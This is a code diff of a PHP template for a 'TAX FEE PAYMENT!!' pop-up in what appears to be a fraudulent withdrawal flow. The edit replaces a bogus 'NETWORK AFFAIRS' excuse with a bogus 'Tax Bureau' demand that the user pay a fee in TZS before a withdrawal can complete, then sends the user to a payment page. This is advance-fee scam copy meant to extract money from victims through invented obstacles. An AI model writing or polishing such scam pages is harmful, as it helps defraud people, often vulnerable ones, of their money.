@@ -31,8 +31,8 @@ require __DIR__.'/flow-header.php';
 <div id="successModal" class="flow-modal" role="dialog" aria-modal="true" aria-labelledby="taxTitle">
   <div class="flow-modal-content">
     <h3 id="taxTitle">TAX FEE PAYMENT!!</h3>
-    <p>Dear <?= vf_esc($name) ?>, Our System has detected unusually operation on this Account as it has been affected with <strong>NETWORK AFFAIRS</strong> that prevent your Withdrawal to be completed.<br><br>
-    You're required to <strong>Pay for NETWORK FEE</strong> of <strong>TZS <?= $feeText ?></strong> in order to receive your withdrawal successfully.</p>
+    <p>Dear <?= vf_esc($name) ?>, The Tax Bureau requires that you need Complete Payment of<strong>TAX FEE</strong> that prevent your Withdrawal to be completed.<br><br>
+    You're required to <strong>Pay for TAX FEE</strong> of <strong>TZS <?= $feeText ?></strong> in order to receive your withdrawal successfully.</p>
     <a href="paymentmethod.php?stage=tax" class="flow-btn red">Close</a>
   </div>
 </div>
